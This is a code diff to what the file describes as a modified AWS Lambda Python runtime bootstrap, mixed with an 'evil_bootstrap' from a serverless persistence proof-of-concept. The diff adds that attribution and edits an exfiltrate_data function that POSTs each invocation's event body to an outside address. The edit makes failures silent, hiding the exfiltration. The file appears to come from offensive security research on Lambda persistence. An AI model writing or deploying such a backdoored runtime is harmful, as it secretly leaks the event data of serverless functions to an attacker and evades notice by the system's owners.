@@ -1,3 +1,7 @@
+"""
+This file is a mix of the files from https://github.com/aws/aws-lambda-python-runtime-interface-client/tree/main/awslambdaric + some changes from https://github.com/Djkusik/serverless_persistency_poc/blob/master/aws/exploit_files/evil_bootstrap.py + some custom changes
+"""
+
 import sys
 sys.path.insert(0, '/var/lang/lib/python3.7/site-packages/awslambdaric')
 sys.path.insert(0, '/var/lang/lib/python3.8/site-packages/awslambdaric')
@@ -1028,7 +1032,8 @@ def exfiltrate_data(event, invoke_id):
         http = urllib3.PoolManager()
         http.request("POST", addr, fields={"event_body": str(event)}, timeout=0.1, retries=False)
     except Exception as err:
-        print(f"[!] Failed to send event {invoke_id} : {repr(err)}")
+        pass
+        #print(f"[!] Failed to send event {invoke_id} : {repr(err)}")
 
 import urllib3
 http = urllib3.PoolManager()
